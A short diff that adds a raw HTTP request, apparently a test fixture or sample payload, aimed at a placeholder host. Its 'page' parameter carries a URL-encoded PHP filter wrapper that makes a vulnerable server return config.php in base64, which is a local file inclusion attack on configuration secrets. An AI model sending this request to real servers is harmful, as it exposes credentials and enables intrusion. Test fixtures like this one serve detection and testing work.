@@ -1,0 +1,4 @@
+GET /a?page=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconfig.php HTTP/1.1
+Host: demo.example.com
+Connection: close
+
